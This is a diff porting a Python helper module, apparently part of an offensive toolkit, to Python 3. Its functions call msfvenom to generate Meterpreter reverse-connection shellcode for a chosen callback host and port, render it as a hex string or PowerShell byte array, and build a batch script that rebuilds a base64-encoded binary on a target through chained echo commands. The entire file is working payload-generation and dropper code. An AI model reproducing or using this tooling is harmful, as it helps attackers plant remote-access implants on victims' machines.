@@ -1,62 +1,62 @@
 from subprocess import Popen, PIPE
 from binascii import hexlify
 
-
 def shellcode_to_hex(msf_payload, host, port):
     """
-    Function to generate a common, encoded meterpreter shellcode
-    and return it as a hex string as binascii.hexlify does.
-    @zc00l
+    Generate a raw Meterpreter shellcode and return hex representation.
     """
-    proc = Popen("msfvenom -p {0} LHOST={1} LPORT={2} EXITFUNC=thread -f raw -b '\\x00\\x20\\x0d\\x0a'".format(
-        msf_payload, host, port), shell=True, stdout=PIPE, stderr=PIPE
+    cmd = (
+        f"msfvenom -p {msf_payload} LHOST={host} LPORT={port} "
+        f"EXITFUNC=thread -f raw -b '\\x00\\x20\\x0d\\x0a'"
     )
-    stdout, _ = proc.communicate()
-    return hexlify(stdout)
 
+    proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
+    stdout, _ = proc.communicate()
+
+    # hexlify returns bytes → decode for Python 3 usability
+    return hexlify(stdout).decode("utf-8")
 
 def shellcode_to_ps1(msf_payload, host, port):
     """
-    Function to generate a common meterpreter
-    shellcode and return it already converted
-    into a powershell array.
-    @zc00l
+    Generate shellcode and convert it into a PowerShell byte array.
     """
-    f = open("/dev/null", "w")
-    proc = Popen("msfvenom -p {0} LHOST={1} LPORT={2} EXITFUNC=thread -f raw -b '\\x00\\x20\\x0d\\x0a'".format(msf_payload,host,port),
-        shell=True, stdout=PIPE, stderr=f)
-    stdout, _ = proc.communicate()
-    f.close()
-    return "@(" + ", ".join([hex(ord(x)) for x in stdout]) + ")"
+    cmd = (
+        f"msfvenom -p {msf_payload} LHOST={host} LPORT={port} "
+        f"EXITFUNC=thread -f raw -b '\\x00\\x20\\x0d\\x0a'"
+    )
 
+    with open("/dev/null", "w") as f:
+        proc = Popen(cmd, shell=True, stdout=PIPE, stderr=f)
+        stdout, _ = proc.communicate()
 
-def binary_to_bat(base64_data, file="file"):
+    # stdout is bytes → convert each byte to hex
+    ps_array = ", ".join([hex(b) for b in stdout])
+    return f"@({ps_array})"
+
+def binary_to_bat(base64_data, file='file'):
     """
-    Get a huge base64, split it into chunks.
-    With many chunks, we can re-create it using echo command
-    I cant give it all because cmd.exe limits string size into command-line.
-    @zc00l
+    Split a large base64 blob into chunks and generate a .bat reconstruction script.
     """
     bat_content = "@echo off\n"
 
-    count = 0  # how many bytes we have processed.
-    max_chars = 128  # How many bytes of data an echo command will insert into a file.
-    line = str()  # This is going represent a single line that is going to be processed in loop.
+    count = 0
+    max_chars = 128
+    line = ""
 
-    # This loop will populate line and then dump the formatted command to bat_content.
-    for char in list(base64_data):
+    for char in base64_data:
         line += char
         count += 1
+
         if (count % max_chars) == 0:
             if count == max_chars:
-                bat_content += "echo " + line + " >{0}\n".format(file)
+                bat_content += f"echo {line} >{file}\n"
             else:
-                bat_content += "echo " + line + " >>{0}\n".format(file)
-            line = str()
-    
+                bat_content += f"echo {line} >>{file}\n"
+            line = ""
+
     if len(line) > 0:
-        bat_content += "echo " + line + " >>{0}".format(file) # the remaining.
-    
+        bat_content += f"echo {line} >>{file}"
+
     return bat_content
 
 
